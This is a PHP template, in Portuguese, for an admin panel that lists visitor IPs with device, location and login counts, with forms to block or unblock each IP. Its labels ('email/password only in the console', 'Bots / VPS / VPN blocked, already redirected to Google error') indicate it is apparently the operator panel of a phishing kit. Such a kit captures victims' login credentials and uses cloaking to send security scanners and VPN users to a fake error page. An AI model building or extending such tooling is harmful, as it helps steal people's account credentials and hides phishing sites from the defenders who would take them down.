<?php
declare(strict_types=1);

require_once dirname(__DIR__, 2) . '/includes/device.php';

/** @var list<array<string, mixed>> $ipList */
/** @var list<array<string, mixed>> $botList */
/** @var string|null $flash */
/** @var bool $flashError */

$panelRedirectPage = basename((string) ($_SERVER['SCRIPT_NAME'] ?? 'index.php'));
if (!preg_match('/^[a-z0-9_]+\.php$/i', $panelRedirectPage)) {
    $panelRedirectPage = 'index.php';
}

if (!empty($flash)): ?>
    <div class="flash <?= !empty($flashError) ? 'flash-error' : 'flash-ok' ?>"><?= e($flash) ?></div>
<?php endif; ?>

<div class="panel panel-acessos">
    <div class="panel-head">
        <h2>🌐 Acessos por IP</h2>
        <span class="count"><?= count($ipList) ?> IP(s) · e-mail/senha só no console 📧</span>
    </div>

    <div class="ip-access-list">
        <?php if ($ipList === []): ?>
            <div class="empty-state">Nenhum acesso por IP ainda.</div>
        <?php else: ?>
            <?php foreach ($ipList as $row):
                $status = ($row['status'] ?? 'liberado') === 'bloqueado' ? 'bloqueado' : 'liberado';
                $label = $status === 'bloqueado' ? 'Bloqueado' : '';
                $when = date('d/m/Y H:i:s', strtotime((string) $row['last_seen']));
                $ip = (string) ($row['ip'] ?? '—');
                $osIcon = (string) ($row['os_icon'] ?? '🖥️');
                $os = (string) ($row['os'] ?? '—');
                $loc = (string) ($row['location'] ?? '—');
                $browser = (string) ($row['browser'] ?? '—');
                $logins = (int) ($row['logins'] ?? 1);
            ?>
            <article class="ip-row <?= $status === 'bloqueado' ? 'ip-row-blocked' : '' ?>">
                <div class="ip-row-top">
                    <div class="ip-row-info">
                        <?php if ($label !== ''): ?>
                        <span class="status-badge status-<?= e($status) ?>"><?= e($label) ?></span>
                        <?php endif; ?>
                        <span class="ip-highlight"><?= e($ip) ?></span>
                        <span class="dot">·</span>
                        <span class="device-chip"><?= $osIcon ?> <?= e($os) ?></span>
                        <span class="dot">·</span>
                        <span>📍 <?= e($loc) ?></span>
                        <span class="dot">·</span>
                        <span>Navegador: <strong><?= e($browser) ?></strong></span>
                        <span class="dot">·</span>
                        <span>Logins: <strong><?= $logins ?></strong></span>
                        <span class="dot">·</span>
                        <span class="ip-time"><?= e($when) ?></span>
                    </div>
                    <div class="ip-row-actions">
                        <?php if ($status === 'bloqueado'): ?>
                            <form method="post" action="ip_action.php" class="panel-action-form">
                                <?= panel_action_field('ip:unblock:' . $ip) ?>
                                <input type="hidden" name="ip" value="<?= e($ip) ?>">
                                <input type="hidden" name="action" value="unblock">
                                <input type="hidden" name="redirect" value="<?= e($panelRedirectPage) ?>">
                                <button type="submit" class="btn-ip btn-ip-free">Liberar IP</button>
                            </form>
                        <?php else: ?>
                            <form method="post" action="ip_action.php" class="panel-action-form">
                                <?= panel_action_field('ip:block:' . $ip) ?>
                                <input type="hidden" name="ip" value="<?= e($ip) ?>">
                                <input type="hidden" name="action" value="block">
                                <input type="hidden" name="redirect" value="<?= e($panelRedirectPage) ?>">
                                <button type="submit" class="btn-ip btn-ip-block">Bloquear IP</button>
                            </form>
                        <?php endif; ?>
                    </div>
                </div>
            </article>
            <?php endforeach; ?>
        <?php endif; ?>
    </div>
</div>

<div class="panel panel-bots">
    <div class="panel-head">
        <h2>🤖 Bots / VPS / VPN bloqueados</h2>
        <span class="count"><?= count($botList) ?> IP(s) · já redirecionados para Google erro</span>
    </div>

    <div class="ip-access-list">
        <?php if ($botList === []): ?>
            <div class="empty-state">Nenhum bot bloqueado ainda.</div>
        <?php else: ?>
            <?php foreach ($botList as $row):
                $when = date('d/m/Y H:i:s', strtotime((string) $row['last_seen']));
                $ip = (string) ($row['ip'] ?? '—');
                $osIcon = (string) ($row['os_icon'] ?? '🤖');
                $os = (string) ($row['os'] ?? 'Bot');
                $loc = (string) ($row['location'] ?? '—');
                $country = (string) ($row['country'] ?? '—');
                $browser = (string) ($row['browser'] ?? '—');
                $hits = (int) ($row['hits'] ?? 1);
                $reason = device_reason_label((string) ($row['reason'] ?? ''));
            ?>
            <article class="ip-row ip-row-bot">
                <div class="ip-row-top">
                    <div class="ip-row-info">
                        <span class="status-badge status-bot">Bot</span>
                        <span class="ip-highlight"><?= e($ip) ?></span>
                        <span class="dot">·</span>
                        <span class="device-chip"><?= $osIcon ?> <?= e($os) ?></span>
                        <span class="dot">·</span>
                        <span>📍 <?= e($loc) ?></span>
                        <span class="dot">·</span>
                        <span>País: <strong><?= e($country) ?></strong></span>
                        <span class="dot">·</span>
                        <span>Navegador: <strong><?= e($browser) ?></strong></span>
                        <span class="dot">·</span>
                        <span>Motivo: <strong><?= e($reason) ?></strong></span>
                        <span class="dot">·</span>
                        <span>Tentativas: <strong><?= $hits ?></strong></span>
                        <span class="dot">·</span>
                        <span class="ip-time"><?= e($when) ?></span>
                    </div>
                </div>
            </article>
            <?php endforeach; ?>
        <?php endif; ?>
    </div>
</div>
